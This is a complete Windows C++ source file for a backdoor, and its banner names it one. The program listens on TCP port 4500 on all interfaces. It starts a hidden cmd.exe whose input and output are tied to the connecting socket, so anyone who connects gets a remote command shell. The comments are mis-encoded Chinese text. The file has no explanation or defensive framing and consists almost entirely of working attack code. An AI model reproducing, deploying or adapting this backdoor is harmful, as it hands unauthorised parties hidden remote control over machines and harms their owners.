// door.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

int cmdshell(SOCKET s)
{   	
	STARTUPINFO si;
	GetStartupInfo(&si);
    si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow=SW_HIDE;
	//ʹcmd���������ֱ�Ӻ�socket����
	si.hStdInput=si.hStdOutput=si.hStdError=(void*)s;
	char cmdline[256];
	//�õ�cmd·��
	GetSystemDirectory(cmdline,sizeof(cmdline));
	strcat(cmdline,"\\cmd.exe");
	PROCESS_INFORMATION ProcessInformation;
	int ret;
	//����cmd����
	ret=CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
	//�ȴ����̽���
	WaitForSingleObject(ProcessInformation.hProcess,INFINITE);
    CloseHandle(ProcessInformation.hProcess);	
	return 0;
}

int main(int argc, char* argv[])
{
	char wMessage[512] = "\r\n========================  BackDoor by �����ѩ  ========================\r\n";
	//��ʼ��socket�����Ҽ����˿�
	SOCKET sClient;	
	BYTE minorVer = 2; 
	BYTE majorVer = 2;
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(minorVer, majorVer);
	if(WSAStartup(sockVersion, &wsaData) != 0)
        return 0;
	//����socket����
    SOCKET sListen = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if(sListen == INVALID_SOCKET)
	{
		printf("WSASocket error \n");
		return 0;
	}
	sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(4500);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;	
	if(bind(sListen, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		printf("bind error \n");
		return 0;
	}
	
	if(listen(sListen, 5) == SOCKET_ERROR)
	{
		printf("listen error \n");
		return 0;
	}
	//��������
	sClient  =accept(sListen,NULL,NULL);	
	send(sClient,wMessage,strlen(wMessage),0);
	//����cmdshell
	cmdshell(sClient);
	return 0;
	
}
